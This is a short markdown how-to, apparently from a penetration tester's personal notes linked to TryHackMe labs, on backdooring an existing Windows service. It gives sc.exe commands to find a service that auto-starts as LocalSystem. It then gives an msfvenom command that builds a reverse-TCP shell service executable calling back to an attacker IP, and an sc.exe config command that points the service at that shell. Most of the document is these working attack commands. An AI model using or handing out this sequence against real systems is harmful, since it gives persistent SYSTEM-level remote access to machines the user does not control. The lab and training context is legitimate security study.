# Exploiting Windows Services
Existing Windows services can have backdoors added to them using `msfvenom`. Begin by finding a candidate service:

```powershell
# Get a list of all available services
#
sc.exe query state=all

# Query information about an existing service. We want a
# service with three properties:
#
#    1. The BINARY_PATH_NAME points to our payload,
#    2. The START_TYPE is “auto” so it runs without user
#       interaction, and
#    3. The SERVICE_START_NAME (the account which the service
#       runs under) is “LocalSystem”.
#
# Note that not every service can be queried, however; the
# ability to do so is controlled by a special per-service
# permission (a Discressionary Access Control List, or DACL).
#
sc.exe qc $SERVICE_NAME
```

Create a replacement service file using `msfvenom` (alternately, a backdoor could be added directly to the binary):

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
	LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
	-f exe-service -o $SERVICE_EXE
```

Note that using `exe-service` is important here, as Windows services need to use an additional set of API calls that are not normally implemented in regular executables.

Finally, update the service definition:

```powershell
# NOTE: A space is required after equals signs for this
# command! It’s not just a weird typo below!
#
sc.exe config $SERVICE_NAME `
	binPath= “$PATH_TO_REVERSE_SHELL_EXE” `
	start= auto obj= “LocalSystem”`
```

Service configurations are stored in the Registry under `HKLM\SYSTEM\CurrentControlSet\Services`; here the user is represented by the `ObjectName` value. DACLs are stored under each service as a `Security` sub-key.

### Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)
* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 
* [Using Metasploit](./Using%20Metasploit.md)
* [Using “netcat”](./Using%20%22netcat%22.md)
